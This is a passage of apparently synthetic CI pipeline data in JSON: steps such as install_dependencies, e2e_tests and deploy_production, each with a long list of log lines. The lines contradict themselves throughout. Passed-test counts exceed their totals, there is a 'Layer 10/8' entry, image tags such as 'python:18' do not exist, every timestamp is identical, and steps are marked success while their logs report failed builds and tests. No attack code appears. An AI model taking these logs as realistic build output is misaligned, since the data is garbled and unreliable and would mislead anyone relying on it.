          "WARNING: express has known vulnerabilities",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.12",
          "\u2713 package completed",
          "Time: 79.621s",
          "Installing eslint@4.19.7",
          "Snapshots: 40 passed, 8 total",
          "  PASS: test_user_create (108ms)",
          "TLS handshake completed",
          "[12:19:19] INFO: Request completed",
          "Ran 17 tests in 41s",
          "[12:19:19] DEBUG: Connection pool: 8 active",
          "Cache hit for key-6428",
          "Artifact downloaded: 8MB",
          "NODE_ENV=production",
          "Waiting...",
          "Cache invalidated: build",
          "Compiling utils/handler.rs...",
          "Completed.",
          "OK",
          "Verifying...",
          "Step 2/24: Building",
          "[12:19:19] DEBUG: Query executed in 83ms",
          "Already up to date.",
          "Fetching submodules...",
          "Success!",
          "\u2713 Step 'checkout' succeeded",
          "Cache saved successfully",
          "FAILED: test_api_health",
          "Optimizing 10 modules...",
          "Connection established",
          "Compiling utils/utils.go...",
          "\u2713 Step 'test' succeeded",
          "Platform: linux-x64",
          "[12:19:19] INFO: Cache refreshed",
          "\u2717 build failed with exit code 62",
          "Cache invalidated: dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Creating production build...",
          "Done.",
          "Pulling image: alpine:latest",
          "Pushing to registry...",
          "\u2717 build failed with exit code 121",
          "Minifying app.js",
          "Processing...",
          "Generating source maps...",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "pip: Downloading webpack-2.0.tar.gz",
          "Transforming 781 files...",
          "WARNING: express has known vulnerabilities",
          "Waiting...",
          "Compiling src/app.ts...",
          "[12:19:19] INFO: Cache refreshed",
          "[12:19:19] DEBUG: Query executed in 53ms",
          "Optimizing 77 modules...",
          "[12:19:19] INFO: Request completed",
          "Snapshots: 27 passed, 10 total",
          "Artifact uploaded: dist.zip (24MB)",
          "\u2717 build failed with exit code 116",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "Transforming 301 files...",
          "TLS handshake completed",
          "[12:19:19] INFO: Connecting to database",
          "Loading...",
          "Step 6/19: Testing",
          "Done.",
          "Artifact uploaded: build.tar.gz (42MB)",
          "OK",
          "Compiling components/index.js...",
          "Creating production build...",
          "Pushing to registry...",
          "Compiling src/handler.rs...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-22T12:20:16.652978",
        "finished_at": "2025-11-22T12:20:38.240669",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Ready.",
          "npm install: resolved 247 packages",
          "\u2713 All checks passed",
          "Transforming 474 files...",
          "Cache restored successfully (73MB)",
          "TLS handshake completed",
          "Test Suites: 34 passed, 44 total",
          "[12:19:19] DEBUG: Memory usage: 127MB",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (60MB)",
          "[12:19:19] WARN: Deprecated API usage",
          "Pulling image: python:3.11",
          "pip install: Successfully installed axios-4.15",
          "Compiling src/handler.rs...",
          "OK",
          "Generating source maps...",
          "[12:19:19] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Cache hit for key-5478",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Ran 197 tests in 14s",
          "Cache restored successfully (262MB)",
          "Finished.",
          "[12:19:19] DEBUG: Query executed in 22ms",
          "Step 9/23: Deploying",
          "[12:19:19] DEBUG: Memory usage: 1683MB",
          "[12:19:19] DEBUG: Query executed in 81ms",
          "  PASS: test_api_health (224ms)",
          "[12:19:19] INFO: Connecting to database",
          "Cache miss for key-8337",
          "\u2713 package completed",
          "POST /upload - 200 (497ms)",
          "Processing...",
          "\u2717 build failed with exit code 109",
          "[12:19:19] WARN: Deprecated API usage",
          "Tests: 349 passed, 66 total",
          "[12:19:19] DEBUG: Loading configuration",
          "pip: Downloading react-1.11.tar.gz",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Tests: 144 passed, 83 total",
          "[12:19:19] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "pip: Downloading lodash-4.0.tar.gz",
          "Step 17/24: Building",
          "[12:19:19] INFO: Request completed",
          "npm notice: package.json updated",
          "Tests: 311 passed, 175 total",
          "Environment: test",
          "Completed.",
          "Test Suites: 22 passed, 21 total",
          "POST /api - 201 (394ms)",
          "Cache miss for key-4977",
          "pip install: Successfully installed eslint-1.0",
          "[12:19:19] INFO: Connecting to database",
          "Step 13/25: Installing dependencies",
          "Compiling utils/app.ts...",
          "[12:19:19] INFO: Cache refreshed",
          "Environment: development",
          "[12:19:19] DEBUG: Query executed in 96ms",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:19:19] DEBUG: Initializing service",
          "Layer 6/12: RUN command",
          "  PASS: test_user_create (189ms)",
          "[12:19:19] DEBUG: Initializing service",
          "Exception: NullPointerException",
          "Coverage: 79% statements, 96% branches",
          "Success!",
          "[12:19:19] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Waiting...",
          "Already up to date.",
          "GET /health - 201 (37ms)",
          "  PASS: test_api_health (141ms)",
          "Completed.",
          "\u2713 Step 'setup' succeeded",
          "yarn add: Done in 28.4s",
          "pip: Downloading axios-5.1.tar.gz",
          "Image pulled successfully",
          "Connection established",
          "Optimizing 61 modules...",
          "Pulling image: node:18",
          "TLS handshake completed",
          "npm install: added 426 packages",
          "[12:19:19] INFO: Processing request",
          "Building Docker image...",
          "FAILED: test_user_create",
          "Fetching submodules...",
          "TLS handshake completed",
          "Using Node.js 14.13.1",
          "Minifying main.js",
          "  PASS: test_cache_hit (375ms)",
          "Completed.",
          "OK",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Building Docker image...",
          "Success!",
          "  PASS: test_cache_hit (149ms)",
          "Processing...",
          "Ready.",
          "\u2713 Task completed in 2182ms",
          "npm notice: created a lockfile",
          "OK",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "[12:19:19] INFO: Cache refreshed",
          "Cache miss for key-9370",
          "Compiling components/handler.rs...",
          "Finished.",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:19] DEBUG: Loading configuration",
          "[12:19:19] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Ran 119 tests in 21s",
          "Step 16/24: Building",
          "\u2717 build failed with exit code 74",
          "Checking out main branch",
          "[12:19:19] DEBUG: Connection pool: 20 active",
          "Artifact uploaded: dist.zip (66MB)",
          "OK",
          "Image pulled successfully",
          "[12:19:19] DEBUG: Query executed in 43ms",
          "Layer 3/10: COPY command",
          "\u2713 package completed",
          "Image pulled successfully",
          "GET /health - 204 (34ms)",
          "Completed.",
          "Tests: 329 passed, 403 total",
          "Ready.",
          "Generating source maps...",
          "Fetching submodules...",
          "Installing eslint@4.7.6",
          "  PASS: test_cache_hit (37ms)",
          "Ready.",
          "Switched to branch 'feature/task-956'",
          "\u2717 build failed with exit code 25",
          "Already up to date.",
          "Minifying main.js",
          "Snapshots: 48 passed, 4 total",
          "Connecting to example.com:443...",
          "  PASS: integration/test_auth_login.spec.js",
          "Pulling image: node:18",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-22T12:20:38.240669",
        "finished_at": "2025-11-22T12:20:45.436566",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Cache miss for key-8063",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Connection established",
          "  PASS: test_cache_hit (292ms)",
          "HEAD is now at df63f3a",
          "pip install: Successfully installed eslint-2.11",
          "npm install: resolved 1029 packages",
          "Verifying...",
          "\u2713 Step 'test' succeeded",
          "Connection established",
          "Optimizing 39 modules...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache invalidated: node_modules",
          "[12:19:19] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "[12:19:19] INFO: Processing request",
          "FAILED: test_cache_hit",
          "[12:19:19] DEBUG: Memory usage: 308MB",
          "Transforming 289 files...",
          "[12:19:19] INFO: Request completed",
          "Already up to date.",
          "Cache miss for key-5915",
          "Platform: darwin-arm64",
          "Compiling lib/service.java...",
          "Exception: ValueError",
          "Compiling utils/app.ts...",
          "GET /api - 200 (42ms)",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 77% statements, 80% branches",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Bundling runtime.css",
          "WARNING: axios has known vulnerabilities",
          "pip: Downloading axios-3.8.tar.gz",
          "\u2713 All checks passed",
          "Compiling src/main.py...",
          "Exception: TypeError",
          "[12:19:19] INFO: Cache refreshed",
          "Waiting...",
          "Connecting to acme.corp:443...",
          "Fetching submodules...",
          "[12:19:19] WARN: Deprecated API usage",
          "Installing jest@1.19.10",
          "Exception: ValueError",
          "Step 13/16: Linting",
          "[12:19:19] DEBUG: Connection pool: 18 active",
          "Environment: development",
          "TLS handshake completed",
          "Cache restored successfully (176MB)",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:19] ERROR: Connection failed",
          "Cache restored successfully (354MB)",
          "Creating production build...",
          "Cache saved successfully",
          "Compiling lib/app.ts...",
          "Cache saved successfully",
          "[12:19:19] WARN: Deprecated API usage",
          "Step 17/19: Deploying",
          "npm install: added 24 packages",
          "Success!",
          "Done.",
          "Coverage: 78% statements, 63% branches",
          "Processing...",
          "[12:19:19] DEBUG: Query executed in 4ms",
          "WARNING: eslint has known vulnerabilities",
          "Cache saved successfully",
          "Generating source maps...",
          "Switched to branch 'feature/task-422'",
          "Using Node.js 20.16.0",
          "Building Docker image...",
          "Fetching submodules...",
          "\u2713 Step 'setup' succeeded",
          "\u2717 build failed with exit code 57",
          "Cache invalidated: build",
          "pip: Downloading eslint-3.19.tar.gz",
          "[12:19:19] INFO: Connecting to database",
          "HEAD is now at d421c38",
          "Connecting to cloud.services:443...",
          "Verifying...",
          "npm install: added 474 packages",
          "Pulling image: python:3.11",
          "Ready.",
          "Tests: 130 passed, 198 total",
          "[12:19:19] INFO: Cache refreshed",
          "\u2713 Step 'build' succeeded",
          "POST /data - 201 (288ms)",
          "POST /data - 200 (347ms)",
          "Cache restored successfully (93MB)",
          "Generating source maps...",
          "[12:19:19] DEBUG: Connection pool: 8 active",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "[12:19:19] INFO: Cache refreshed",
          "npm install: resolved 996 packages",
          "Coverage: 87% statements, 71% branches",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: dist.zip (23MB)",
          "[12:19:19] WARN: Deprecated API usage",
          "Cache hit for key-4405",
          "[12:19:19] INFO: Cache refreshed",
          "Pushing to registry...",
          "Creating production build...",
          "Step 1/18: Linting",
          "Cache saved successfully",
          "Waiting...",
          "Installing lodash@2.1.5",
          "Platform: darwin-arm64",
          "Artifact uploaded: dist.zip (34MB)",
          "Compiling src/service.java...",
          "Step 11/16: Running migrations",
          "Artifact downloaded: 18MB",
          "Transforming 956 files...",
          "pip: Downloading axios-1.6.tar.gz",
          "[12:19:19] DEBUG: Connection pool: 7 active",
          "GET /status - 200 (94ms)",
          "Building Docker image...",
          "pip install: Successfully installed axios-1.7",
          "Cache hit for key-3147",
          "npm install: added 335 packages",
          "TLS handshake completed",
          "[12:19:19] INFO: Connecting to database",
          "[12:19:19] DEBUG: Connection pool: 19 active",
          "  PASS: test_user_create (198ms)",
          "Bundling styles.js",
          "npm install: added 290 packages",
          "Pulling image: python:18",
          "Compiling src/handler.rs...",
          "GET /api - 204 (98ms)",
          "Success!",
          "Uploading artifact 'dist' (3 files)",
          "[12:19:19] DEBUG: Connection pool: 13 active",
          "POST /upload - 201 (314ms)",
          "Tests: 486 passed, 149 total",
          "Test Suites: 45 passed, 24 total",
          "Step 14/19: Building",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-22T12:20:45.436566",
        "finished_at": "2025-11-22T12:20:48.314925",
        "log_lines": [
          "=== Step: deploy_production ===",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting react",
          "Pushing to registry...",
          "yarn add: Done in 22.20s",
          "[12:19:19] WARN: Deprecated API usage",
          "Exception: ValueError",
          "Waiting...",
          "Environment: development",
          "Layer 7/15: RUN command",
          "TLS handshake completed",
          "Test Suites: 49 passed, 7 total",
          "[12:19:19] INFO: Starting build process",
          "Pulling image: node:3.11",
          "Connection established",
          "Image pulled successfully",
          "[12:19:19] DEBUG: Connection pool: 12 active",
          "Using Python 3.11",
          "  PASS: e2e/test_db_connect.spec.js",
          "Step 17/19: Building",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "WARNING: eslint has known vulnerabilities",
          "Step 8/22: Running migrations",
          "GET /health - 204 (40ms)",
          "Step 2/15: Deploying",
          "Environment: production",
          "Layer 2/12: ENV command",
          "  PASS: test_auth_login (284ms)",
          "WARNING: jest has known vulnerabilities",
          "[12:19:19] INFO: Cache refreshed",
          "Already up to date.",
          "[12:19:19] INFO: Request completed",
          "Step 16/20: Deploying",
          "Compiling lib/app.ts...",
          "Environment: staging",
          "\u2713 Task completed in 3686ms",
          "Ready.",
          "Platform: win32-x64",
          "[12:19:19] INFO: Processing request",
          "Optimizing 51 modules...",
          "Completed.",
          "Platform: linux-x64",
          "Artifact uploaded: dist.zip (62MB)",
          "Switched to branch 'feature/task-271'",
          "Pulling image: alpine:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "[12:19:19] INFO: Cache refreshed",
          "[12:19:19] WARN: Deprecated API usage",
          "Connection established",
          "OK",
          "Step 14/17: Linting",
          "OK",
          "FAILED: test_auth_login",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "Cache miss for key-5124",
          "[12:19:19] DEBUG: Query executed in 90ms",
          "\u2713 Step 'setup' succeeded",
          "Creating production build...",
          "Finished.",
          "Creating production build...",
          "[12:19:19] INFO: Cache refreshed",
          "Using Node.js 15.6.2",
          "  PASS: test_user_create (376ms)",
          "[12:19:19] INFO: Connecting to database",
          "[12:19:19] INFO: Starting build process",
          "Minifying vendor.js",
          "[12:19:19] DEBUG: Initializing service",
          "Platform: linux-x64",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Done.",
          "Generating source maps...",
          "Building Docker image...",
          "[12:19:19] DEBUG: Query executed in 14ms",
          "Using Python 3.10",
          "Compiling src/app.ts...",
          "Image pulled successfully",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "[12:19:19] INFO: Cache refreshed",
          "Step 14/22: Deploying",
          "[12:19:19] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Connection established",
          "Pulling image: alpine:3.11",
          "[12:19:19] INFO: Request completed",
          "Coverage: 100% statements, 96% branches",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'coverage' (24 files)",
          "Compiling lib/app.ts...",
          "Step 16/18: Deploying",
          "Already up to date.",
          "HEAD is now at 171c9cb",
          "Cache invalidated: build",
          "Pulling image: node:18",
          "[12:19:19] INFO: Cache refreshed",
          "Fetching submodules...",
          "GET /status - 204 (92ms)",
          "Cache hit for key-4320",
          "Test Suites: 15 passed, 29 total",
          "\u2713 Task completed in 2090ms",
          "Image pulled successfully",
          "HEAD is now at de9fe22",
          "Step 17/17: Deploying",
          "Using Node.js 17.15.6",
          "Coverage: 95% statements, 94% branches",
          "  PASS: test_api_health (316ms)",
          "Cache invalidated: node_modules",
          "yarn add: Done in 11.84s",
          "Loading...",
          "Tests: 76 passed, 415 total",
          "pip install: Successfully installed axios-1.10",
          "TLS handshake completed",
          "Layer 7/11: COPY command",
          "[12:19:19] DEBUG: Query executed in 40ms",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:19:19] INFO: Cache refreshed",
          "Checking out main branch",
          "Snapshots: 34 passed, 17 total",
          "pip: Collecting react",
          "Using Node.js 20.0.7",
          "Cache restored successfully (75MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting react",
          "Verifying...",
          "[12:19:19] DEBUG: Connection pool: 6 active",
          "Using Node.js 15.17.7",
          "Compiling components/main.py...",
          "Ready.",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Uploading artifact 'coverage' (29 files)",
          "[12:19:19] INFO: Connecting to database",
          "Using Python 3.11",
          "Already up to date.",
          "Switched to branch 'feature/task-171'",
          "Completed.",
          "Compiling components/utils.go...",
          "pip: Downloading axios-5.2.tar.gz",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Pulling image: alpine:18",
          "Checking out develop branch",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-22T12:20:48.314925",
        "finished_at": "2025-11-22T12:21:02.706719",
        "log_lines": [
          "=== Step: integration_tests ===",
          "pip install: Successfully installed prettier-5.13",
          "Step 15/22: Deploying",
          "Pushing to registry...",
          "[12:19:19] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (295ms)",
          "Artifact uploaded: dist.zip (65MB)",
          "Creating production build...",
          "Success!",
          "Connecting to cloud.services:443...",
          "Cache restored successfully (44MB)",
          "Success!",
          "pip install: Successfully installed eslint-5.7",
          "Snapshots: 1 passed, 4 total",
          "Optimizing 27 modules...",
          "Using Node.js 19.4.5",
          "Layer 8/14: RUN command",
          "Waiting...",
          "GET /api - 204 (59ms)",
          "\u2713 Step 'setup' succeeded",
          "\u2713 Task completed in 2753ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "[12:19:19] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Compiling components/utils.go...",
          "Processing...",
          "Layer 1/14: RUN command",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Already up to date.",
          "Connection established",
          "Connecting to startup.dev:443...",
          "[12:19:19] INFO: Connecting to database",
          "pip: Collecting webpack",
          "[12:19:19] DEBUG: Connection pool: 14 active",
          "GET /health - 201 (68ms)",
          "Generating source maps...",
          "Step 12/16: Installing dependencies",
          "Creating production build...",
          "[12:19:19] DEBUG: Connection pool: 1 active",
          "Test Suites: 9 passed, 46 total",
          "[12:19:19] DEBUG: Loading configuration",
          "[12:19:19] DEBUG: Initializing service",
          "[12:19:19] DEBUG: Connection pool: 2 active",
          "\u2713 Task completed in 1195ms",
          "Step 10/17: Testing",
          "pip: Downloading webpack-5.6.tar.gz",
          "\u2713 All checks passed",
          "Platform: win32-x64",
          "Ready.",
          "Image pulled successfully",
          "OK",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (44 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "Minifying main.js",
          "Cache restored successfully (136MB)",
          "Coverage: 80% statements, 91% branches",
          "Checking out main branch",
          "Using Node.js 20.15.9",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 366 packages",
          "Step 12/24: Installing dependencies",
          "npm install: added 477 packages",
          "Optimizing 98 modules...",
          "Waiting...",
          "Snapshots: 3 passed, 48 total",
          "Building Docker image...",
          "Optimizing 19 modules...",
          "Cache restored successfully (286MB)",
          "Compiling src/handler.rs...",
          "Pulling image: alpine:18",
          "[12:19:19] INFO: Starting build process",
          "Time: 58.144s",
          "[12:19:19] INFO: Request completed",
          "\u2717 build failed with exit code 7",
          "Verifying...",
          "Transforming 231 files...",
          "  PASS: e2e/test_db_connect.spec.js",
          "WARNING: axios has known vulnerabilities",
          "Fetching submodules...",
          "\u2713 Step 'install' succeeded",
          "[12:19:19] INFO: Connecting to database",
          "npm install: added 32 packages",
          "Pushing to registry...",
          "[12:19:19] INFO: Processing request",
          "[12:19:19] DEBUG: Initializing service",
          "Waiting...",
          "Uploading artifact 'dist' (22 files)",
          "Step 19/23: Deploying",
          "Pulling image: alpine:18",
          "Waiting...",
          "Success!",
          "Artifact downloaded: 12MB",
          "Ready.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:19] INFO: Cache refreshed",
          "[12:19:19] INFO: Request completed",
          "[12:19:19] WARN: Deprecated API usage",
          "[12:19:19] DEBUG: Loading configuration",
          "Compiling lib/index.js...",
          "FAILED: test_cache_hit",
          "Optimizing 70 modules...",
          "Switched to branch 'feature/task-184'",
          "Image pulled successfully",
          "\u2713 Task completed in 2531ms",
          "pip install: Successfully installed jest-1.8",
          "Ran 146 tests in 48s",
          "\u2713 Step 'checkout' succeeded",
          "Using Python 3.10",
          "Cache miss for key-7313",
          "Done.",
          "Step 10/23: Deploying",
          "Layer 2/14: RUN command",
          "[12:19:19] DEBUG: Memory usage: 572MB",
          "npm install: added 284 packages",
          "npm notice: created a lockfile",
          "Tests: 95 passed, 457 total",
          "Using Python 3.12",
          "Compiling src/service.java...",
          "Pushing to registry...",
          "\u2713 Step 'install' succeeded",
          "Cache invalidated: node_modules",
          "Cache saved successfully",
          "npm install: added 438 packages",
          "[12:19:19] DEBUG: Memory usage: 1520MB",
          "Connecting to example.com:443...",
          "[12:19:19] INFO: Request completed",
          "Cache restored successfully (35MB)",
          "Generating source maps...",
          "[12:19:19] INFO: Request completed",
          "Optimizing 87 modules...",
          "Layer 1/13: RUN command",
          "Done.",
          "[12:19:19] ERROR: Connection failed",
          "OK",
          "Compiling lib/handler.rs...",
          "Connection established",
          "GET /status - 204 (56ms)",
          "[12:19:19] DEBUG: Loading configuration",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-22T12:21:02.706719",
        "finished_at": "2025-11-22T12:21:05.585078",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache invalidated: dependencies",
          "Exception: NullPointerException",
          "Test Suites: 10 passed, 18 total",
          "Installing lodash@1.19.0",
          "Platform: win32-x64",
          "[12:19:19] DEBUG: Query executed in 15ms",
          "\u2713 Task completed in 2655ms",
          "[12:19:19] DEBUG: Query executed in 55ms",
          "npm notice: created a lockfile",
          "Cache restored successfully (215MB)",
          "Coverage: 89% statements, 96% branches",
          "Cache restored successfully (149MB)",
          "Finished.",
          "Building Docker image...",
          "Artifact downloaded: 48MB",
          "\u2713 Task completed in 4598ms",
          "pip: Installing build dependencies...",
          "Test Suites: 19 passed, 39 total",
          "npm notice: package.json updated",
          "GET /status - 201 (50ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 95 tests in 48s",
          "Generating source maps...",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Uploading artifact 'coverage' (36 files)",
          "Step 9/20: Building",
          "Snapshots: 22 passed, 31 total",
          "Using Python 3.9",
          "Success!",
          "\u2717 build failed with exit code 116",
          "Switched to branch 'feature/task-797'",
          "Layer 6/15: ENV command",
          "Pulling image: alpine:3.11",
          "Image pulled successfully",
          "pip: Collecting jest",
          "[12:19:19] INFO: Request completed",
          "Snapshots: 31 passed, 6 total",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: dependencies",
          "FAILED: test_db_connect",
          "[12:19:19] INFO: Request completed",
          "Done.",
          "Minifying app.js",
          "\u2713 build completed",
          "Verifying...",
          "Layer 10/8: ENV command",
          "Snapshots: 18 passed, 30 total",
          "Already up to date.",
          "[12:19:19] WARN: Deprecated API usage",
          "Snapshots: 11 passed, 14 total",
          "Test Suites: 30 passed, 17 total",
          "yarn add: Done in 19.47s",
          "\u2713 test completed",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "Step 2/24: Deploying",
          "Snapshots: 4 passed, 35 total",
          "pip install: Successfully installed lodash-1.10",
          "[12:19:19] DEBUG: Query executed in 85ms",
          "Installing lodash@1.6.8",
          "[12:19:19] INFO: Cache refreshed",
          "Cache saved successfully",
          "[12:19:19] DEBUG: Memory usage: 133MB",
          "\u2713 Task completed in 3002ms",
          "Connecting to example.com:443...",
          "Loading...",
          "[12:19:19] DEBUG: Connection pool: 12 active",
          "Optimizing 96 modules...",
          "Compiling components/index.js...",
          "[12:19:19] DEBUG: Query executed in 38ms",
          "POST /data - 200 (188ms)",
          "HEAD is now at 4e48d84",
          "[12:19:19] INFO: Starting build process",
          "Exception: TypeError",
          "Exception: TypeError",
          "Bundling vendor.js",
          "Loading...",
          "  PASS: test_api_health (135ms)",
          "pip install: Successfully installed lodash-4.11",
          "pip: Installing build dependencies...",
          "OK",
          "[12:19:19] INFO: Cache refreshed",
          "FAILED: test_auth_login",
          "Layer 4/13: COPY command",
          "Layer 10/12: RUN command",
          "OK",
          "Using Node.js 20.13.7",
          "pip: Installing build dependencies...",
          "Cache restored successfully (483MB)",
          "Waiting...",
          "Snapshots: 17 passed, 27 total",
          "pip install: Successfully installed react-5.20",
          "Cache miss for key-7554",
          "Using Node.js 16.2.7",
          "WARNING: eslint has known vulnerabilities",
          "Minifying vendor.js",
          "Already up to date.",
          "Pushing to registry...",
          "Processing...",
          "Optimizing 22 modules...",
          "Waiting...",
          "Platform: linux-x64",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:19:19] DEBUG: Connection pool: 16 active",
          "npm notice: created a lockfile",
          "[12:19:19] INFO: Connecting to database",
          "Uploading artifact 'dist' (43 files)",
          "Cache miss for key-4177",
          "[12:19:19] WARN: Deprecated API usage",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "\u2717 build failed with exit code 108",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Cache saved successfully",
          "Tests: 304 passed, 432 total",
          "Waiting...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Optimizing 51 modules...",
          "[12:19:19] DEBUG: Loading configuration",
          "Compiling components/service.java...",
          "Using Node.js 18.7.3",
          "[12:19:19] WARN: Deprecated API usage",
          "Finished.",
          "Completed.",
          "pip install: Successfully installed jest-2.5",
          "Cache saved successfully",
          "Step 17/21: Installing dependencies",
          "[12:19:19] INFO: Request completed",
          "Done.",
          "Environment: production",
          "OK",
          "Cache invalidated: build",
          "Artifact downloaded: 19MB",
          "\u2713 Step 'test' succeeded",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:19] INFO: Starting build process",
          "Step 3/20: Linting",
          "Step 14/17: Building",
          "OK",
          "Minifying vendor.js",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-22T12:21:05.585078",
        "finished_at": "2025-11-22T12:21:09.902616",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Loading...",
          "FAILED: test_db_connect",
          "Transforming 438 files...",
          "Environment: test",
          "\u2713 Step 'checkout' succeeded",
          "Finished.",
          "[12:19:19] DEBUG: Connection pool: 16 active",
          "Processing...",
          "Step 12/16: Linting",
          "TLS handshake completed",
          "[12:19:19] INFO: Connecting to database",
          "Waiting...",
          "Cache hit for key-5544",
          "Compiling utils/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:19] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Platform: win32-x64",
          "FAILED: test_api_health",
          "Using Python 3.12",
          "Image pulled successfully",
          "Tests: 289 passed, 54 total",
          "HEAD is now at bf20530",
          "Uploading artifact 'coverage' (28 files)",
          "Cache hit for key-6433",
          "Cache invalidated: node_modules",
          "Finished.",
          "\u2713 All checks passed",
          "[12:19:19] DEBUG: Connection pool: 8 active",
          "[12:19:19] ERROR: Connection failed",
          "Cache miss for key-5743",
          "npm notice: package.json updated",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "NODE_ENV=production",
          "Step 9/23: Building",
          "Bundling main.css",
          "npm notice: package.json updated",
          "Building Docker image...",
          "\u2713 lint completed",
          "Image pulled successfully",
          "Installing react@1.12.10",
          "Using Python 3.10",
          "Cache invalidated: node_modules",
          "Test Suites: 31 passed, 27 total",
          "Finished.",
          "pip install: Successfully installed react-3.1",
          "Installing react@5.3.7",
          "Minifying main.js",
          "TLS handshake completed",
          "[12:19:19] DEBUG: Query executed in 88ms",
          "Step 16/16: Building",
          "Step 12/25: Running migrations",
          "Cache restored successfully (404MB)",
          "Done.",
          "Image pulled successfully",
          "Snapshots: 9 passed, 41 total",
          "Ready.",
          "[12:19:19] INFO: Processing request",
          "OK",
          "[12:19:19] INFO: Starting build process",
          "Pushing to registry...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling styles.css",
          "Cache miss for key-1307",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/service.java...",
          "Fetching submodules...",
          "Verifying...",
          "Fetching submodules...",
          "Cache restored successfully (276MB)",
          "Fetching submodules...",
          "FAILED: test_api_health",
          "[12:19:19] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Transforming 170 files...",
          "Installing jest@1.1.6",
          "Processing...",
          "[12:19:19] INFO: Request completed",
          "Using Node.js 20.1.6",
          "HEAD is now at dab2040",
          "NODE_ENV=test",
          "WARNING: jest has known vulnerabilities",
          "[12:19:19] DEBUG: Connection pool: 6 active",
          "Step 6/19: Linting",
          "Artifact downloaded: 6MB",
          "[12:19:19] DEBUG: Query executed in 1ms",
          "\u2713 Step 'checkout' succeeded",
          "Completed.",
          "Connection established",
